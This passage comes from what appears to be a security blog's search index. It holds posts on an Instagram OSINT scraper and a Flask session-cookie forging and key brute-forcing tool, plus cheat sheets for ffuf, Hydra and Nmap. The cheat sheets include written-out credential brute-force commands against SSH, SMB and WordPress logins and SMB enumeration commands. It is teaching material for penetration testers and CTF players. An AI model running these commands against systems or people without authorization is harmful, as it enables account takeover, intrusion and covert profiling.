hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"examples\"\u003eExamples\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a content size of 4242 bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -fs \u003cspan style=\"color:#ae81ff\"\u003e4242\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter responses with a 401 status code\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/values.txt -u https://target_url/script.php?valid_name\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eFUZZ -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Filter 401 responses and fuzz passwords in a POST request\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w /path/to/postdata.txt -X POST -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34;\u003c/span\u003e -u https://target_url/login.php -fc \u003cspan style=\"color:#ae81ff\"\u003e401\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-c\u003c/code\u003e\u003c/strong\u003e: Enable colorized output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-maxtime\u003c/code\u003e\u003c/strong\u003e: Set the maximum runtime for the process in seconds.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p\u003c/code\u003e\u003c/strong\u003e: Set a delay between requests (e.g., \u003ccode\u003e0.1\u003c/code\u003e seconds).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-v\u003c/code\u003e\u003c/strong\u003e: Verbose output.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t\u003c/code\u003e\u003c/strong\u003e: Number of threads (default is 40).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-mc\u003c/code\u003e\u003c/strong\u003e: Match specific HTTP status codes (e.g., \u003ccode\u003e200\u003c/code\u003e, \u003ccode\u003e301\u003c/code\u003e, \u003ccode\u003e403\u003c/code\u003e, or \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-fc\u003c/code\u003e\u003c/strong\u003e: Filter out responses by HTTP status codes.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-w\u003c/code\u003e\u003c/strong\u003e: Specify the wordlist path.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u\u003c/code\u003e\u003c/strong\u003e: Define the target URL.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s\u003c/code\u003e\u003c/strong\u003e: Enable silent mode.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-recursion\u003c/code\u003e\u003c/strong\u003e: Enable recursive fuzzing.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r\u003c/code\u003e\u003c/strong\u003e: Follow redirects.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-o\u003c/code\u003e\u003c/strong\u003e: Output results to a file.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-of\u003c/code\u003e\u003c/strong\u003e: Specify output format (e.g., \u003ccode\u003ejson\u003c/code\u003e, \u003ccode\u003ehtml\u003c/code\u003e, \u003ccode\u003ecsv\u003c/code\u003e, \u003ccode\u003eall\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-b\u003c/code\u003e\u003c/strong\u003e: Include cookies in the request.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"examples-1\"\u003eExamples\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Match all responses, filter 42-byte answers, output colored and verbose\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs \u003cspan style=\"color:#ae81ff\"\u003e42\u003c/span\u003e -c -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz host headers and show only status 200 responses\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w hosts.txt -u https://example.org/ -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Host: FUZZ\u0026#34;\u003c/span\u003e -mc \u003cspan style=\"color:#ae81ff\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w entries.txt -u https://example.org/ -X POST -H \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Content-Type: application/json\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e-d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39;\u003c/span\u003e -fr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eVAL -mr \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;VAL\u0026#34;\u003c/span\u003e -c\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"tips-and-tricks\"\u003eTips and Tricks\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eInteractive Mode\u003c/strong\u003e: Press \u003ccode\u003eEnter\u003c/code\u003e while FFUF is running to access interactive features, such as reconfiguring filters or saving the state.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMultiple Payloads\u003c/strong\u003e: Use the \u003ccode\u003eFUZZ\u003c/code\u003e keyword multiple times in a URL (e.g., \u003ccode\u003ehttps://example.org/path/FUZZ/another_path/FUZZ\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVariables in URLs\u003c/strong\u003e: Specify payload locations using variables (e.g., \u003ccode\u003ehttps://example.org/path/{var1}/another_path/{var2}\u003c/code\u003e).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eFFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\u003c/p\u003e","title":"ffuf"},{"content":"Flask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together FlaskOfCookies, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\nTo be clear, this isn’t entirely my invention. It started because I hit a wall on a Root-Me challenge—I couldn’t get it done with noraj’s tool (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\nWhy Session Cookies Matter Session cookies in Flask encode data into a compact, URL-safe string. They’re handy for keeping track of users or passing small pieces of data between the client and server. But they also mean your data sits in plain sight. If you’re not careful with what you store—or if your secret key isn’t strong—those cookies can tell stories you’d rather keep quiet.\nWhat Does FlaskOfCookies Do? Decoding Cookies FlaskOfCookies can crack open a Flask session cookie and show you the contents. If you have the secret key, it’ll reconstruct the original session data. Without the key, it’ll still give you a peek at the encoded structure. This is helpful for:\nChecking if sensitive information is leaking. Testing whether session data is being properly secured. Encoding Cookies Need to create a Flask-compatible session cookie? FlaskOfCookies takes a Python dictionary and a secret key as input and spits out a session cookie. This is handy if you’re:\nDebugging session handling in your app. Seeing how different data structures get encoded. Brute-Forcing Secret Keys If you don’t know the secret key, FlaskOfCookies can try to guess it for you. Just supply a wordlist, and the tool will hammer away until it finds a match (or gives up). This isn’t a feature for cracking into random apps; it’s a wake-up call to use strong, random keys. If you’re using “password123” for your Flask secret, consider yourself warned.\nHow It Works FlaskOfCookies is built on Flask’s session-handling mechanisms and the itsdangerous library, which Flask uses under the hood. It aligns with Flask’s default behavior, including the cookie-session salt, to make sure the results match what Flask itself would produce.\nHere’s the general flow:\nDecoding: The tool parses the encoded cookie value, optionally verifying it against a provided secret key. Encoding: It serializes a Python dictionary into a session cookie using Flask-compatible methods. Brute-Forcing: Tries every key in your wordlist to find the one that correctly decodes the cookie. It’s straightforward, with clear error messages and input validation to keep things manageable.\nWhy Use FlaskOfCookies? Honestly, this is more of a “because I had to” kind of tool. After struggling with the Root-Me challenge and realizing noraj’s tool wasn’t working for me, I figured I’d make something myself. FlaskOfCookies won’t win awards, but it’s lightweight, easy to use, and gives you insight into how Flask manages session cookies. Whether you’re a Flask developer or a security researcher, it can help you:\nLearn how session cookies work. Test your app for key management flaws. Debug session-related bugs. Getting Started with FlaskOfCookies First, make sure you have Python 3.x installed. You’ll also need Flask and itsdangerous:\npip install Flask itsdangerous Then, grab FlaskOfCookies from the repository:\ngit clone https://github.com/noobosaurus-r3x/FlaskOfCookies cd FlaskOfCookies Alternatively, you can download the FOC.py script directly.\nWhat You Can Do With It Here’s a quick guide to the tool’s commands:\nDecode a Session Cookie If you know the secret key:\npython3 FOC.py decode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Without the key, you can still see the structure:\npython3 FOC.py decode -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; Encode a Session Cookie To create a new session cookie:\npython3 FOC.py encode -s \u0026#39;\u0026lt;secret_key\u0026gt;\u0026#39; -t \u0026#34;{\u0026#39;username\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;role\u0026#39;:\u0026#39;superuser\u0026#39;}\u0026#34; Brute-Force the Secret Key To test key strength with a wordlist:\npython3 FOC.py bruteforce -c \u0026#39;\u0026lt;cookie_value\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;path_to_wordlist\u0026gt;\u0026#39; Final Thoughts FlaskOfCookies isn’t groundbreaking, but it’s a practical little tool for anyone exploring Flask session cookies. Whether you’re trying to figure out how they work, testing your app’s security, or debugging a frustrating challenge, it’ll save you some time.\nRemember, this started as a personal project to solve a specific problem, so don’t expect perfection. That said, I hope it’s useful—and if you think of ways to improve it, feel free to fork the repo and go wild. You can find it here.\n","permalink":"http://localhost:1313/tools/flask_of_cookies/","summary":"\u003cp\u003eFlask web applications are clever beasts, storing session data client-side in cookies. It’s convenient for developers, but it can also be a security rabbit hole if you’re not careful. That’s why I put together \u003cstrong\u003eFlaskOfCookies\u003c/strong\u003e, a tool to help you decode, encode, and (if necessary) brute-force Flask session cookies.\u003c/p\u003e\n\u003cp\u003eTo be clear, this isn’t entirely my invention. It started because I hit a wall on a \u003cstrong\u003eRoot-Me challenge\u003c/strong\u003e—I couldn’t get it done with \u003cstrong\u003enoraj’s tool\u003c/strong\u003e (props to Alexandre Zanni for his great work). So, I decided to rework it, adding my own spin to tackle the issue. This tool is for anyone who’s curious about Flask’s session cookies, whether you’re debugging, testing, or just poking around.\u003c/p\u003e","title":"FlaskOfCookies"},{"content":"Hydra is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\nBasic Syntax hydra [options] \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt; Common Flags -h: Display the help menu. -l \u0026lt;username\u0026gt;: Specify a single username/login. -L \u0026lt;wordlist\u0026gt;: Use a wordlist for usernames/logins. -p \u0026lt;password\u0026gt;: Specify a single password. -P \u0026lt;wordlist\u0026gt;: Use a wordlist for passwords. -s \u0026lt;PORT\u0026gt;: Specify the target port. -f: Stop brute-forcing after finding valid credentials. -R: Restore a previous session. -t \u0026lt;number\u0026gt;: Set the number of threads to use. -V: Enable verbose mode. Supported Protocols Hydra supports numerous protocols, including:\nSSH FTP POP3 HTTP-FORM-GET HTTP-FORM-POST HTTP-HEAD HTTP-POST HTTP-GET IMAP SMB SMTP MySQL For the full list, refer to Hydra\u0026rsquo;s help menu (hydra -h).\nExamples SSH Brute-Force Attack hydra -l admin -P rockyou.txt 192.168.10.10 ssh SSH with Multiple Usernames hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 ssh SMB Brute-Force Attack hydra -L top-usernames-shortlist.txt -P rockyou.txt 192.168.10.10 smb Brute-Forcing HTTP POST Forms Hydra can handle custom HTTP POST forms:\nhydra -l admin -P rockyou.txt 192.168.10.10 http-post-form \\ \u0026#34;/login:username=admin\u0026amp;password=^PASS^:F=Your password is incorrect\u0026#34; Wordpress Login Brute-Force Hydra can target WordPress login forms with custom parameters:\nhydra -l admin -P rockyou.txt 192.168.10.10 -V http-form-post \\ \u0026#34;/wp-login.php:log=admin\u0026amp;pwd=^PASS^\u0026amp;wp-submit=Log In\u0026amp;testcookie=1:S=Location\u0026#34; Tips and Tricks Session Management: Use -R to restore interrupted sessions without starting over. Efficiency: Adjust the number of threads with -t to balance speed and server load. Verbose Mode: Use -V to see each login attempt in real-time, useful for troubleshooting. Custom Form Parameters: Understand the target login form structure to craft precise Hydra commands. Final Thoughts Hydra is an essential tool in the arsenal of penetration testers and security professionals. While powerful, it must be used responsibly and only with proper authorization. Keep this cheat sheet handy to efficiently navigate Hydra\u0026rsquo;s capabilities and tailor it to your testing needs.\n\u0026ndash;\n","permalink":"http://localhost:1313/cheat-sheets/hydra/","summary":"\u003cp\u003e\u003cstrong\u003eHydra\u003c/strong\u003e is a powerful and flexible password-cracking tool designed for brute-forcing authentication protocols. It supports a wide range of protocols and is highly configurable for various use cases.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ehydra \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u0026lt;IP\u0026gt; \u0026lt;protocol\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-flags\"\u003eCommon Flags\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-h\u003c/code\u003e\u003c/strong\u003e: Display the help menu.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-l \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single username/login.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-L \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for usernames/logins.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a single password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-P \u0026lt;wordlist\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Use a wordlist for passwords.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;PORT\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target port.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-f\u003c/code\u003e\u003c/strong\u003e: Stop brute-forcing after finding valid credentials.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Restore a previous session.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-t \u0026lt;number\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Set the number of threads to use.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-V\u003c/code\u003e\u003c/strong\u003e: Enable verbose mode.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"supported-protocols\"\u003eSupported Protocols\u003c/h2\u003e\n\u003cp\u003eHydra supports numerous protocols, including:\u003c/p\u003e","title":"Hydra"},{"content":"Nmap (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\nBasic Syntax nmap \u0026lt;target IP\u0026gt; nmap -sT -sS -Pn -v 10.10.10.10 sudo nmap -A -sS -Pn 10.10.10.10 sudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10 Common Flags Scan Types -sT: Perform a TCP connect scan. -sU: Perform a UDP scan. -sS: Perform a SYN scan (\u0026ldquo;Stealth Scan\u0026rdquo;). -Pn: Skip pinging the target. -sn: Host discovery without scanning ports. -A: Enable aggressive scan options. Advanced Features -p \u0026lt;PORT\u0026gt;: Scan specific ports. -p-: Scan all 65,535 ports. -sV: Detect services and versions running on the target. -O: Detect the operating system. -v****, -vv, ********-vvv: Set verbosity levels. --script vuln: Run vulnerability scripts. --script vulners: Use vulners scripts for CVE-based scanning. --script=http-enum: Act like Nikto to enumerate HTTP resources. Output Formats -oN: Normal text output, best for human-readable logs during manual reviews. -oX: XML output, ideal for automated tools or integrations that require structured data. ``: Greppable output, useful for scripting and quickly filtering resulst with tools like grep. -oA: Generate all three formats at once, providing maximum flexibility for further analysis or reporting. SMB Scripts Enumerate Security Mode nmap -p445 --script smb-security-mode 192.168.1.1 Enumerate Sessions nmap -p445 --script smb-enum-sessions 192.168.1.1 nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares nmap -p445 --script smb-enum-shares 192.168.1.1 nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Shares with Listing Listing shares and their contents can reveal valuable information about a system, such as misconfigured permissions or sensitive files stored in shared directories. This is especially important during audits or penetration tests to identify potential security gaps.\nnmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Users nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Stats nmap -p445 --script smb-enum-stats --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Domains nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=password 192.168.1.1 Enumerate Groups nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=password 192.168.1.1 SSH Scripts Enumerate Algorithms nmap 192.168.1.1 -p 22 --script ssh2-enum-algos Enumerate Host Keys nmap 192.168.1.1 -p 22 --script ssh-hostkey --script-args ssh_hostkey=full Enumerate Authentication Methods nmap 192.168.1.1 -p 22 --script ssh-auth-methods --script-args=\u0026#34;ssh.user=admin\u0026#34; Final Thoughts Nmap is a versatile and robust tool that adapts to a wide range of use cases, from simple port scans to detailed vulnerability assessments. Keep this cheat sheet handy for quick reference, and remember: the more you practice, the more efficient your scanning workflows will become!\n","permalink":"http://localhost:1313/cheat-sheets/nmap/","summary":"\u003cp\u003e\u003cstrong\u003eNmap\u003c/strong\u003e (Network Mapper) is the go-to tool for network discovery and security auditing. It’s powerful, flexible, and essential for professionals in cybersecurity.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap \u0026lt;target IP\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enmap -sT -sS -Pn -v 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -A -sS -Pn 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo nmap -sV -sT -O -p- -vv --script vulners 10.10.10.10\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 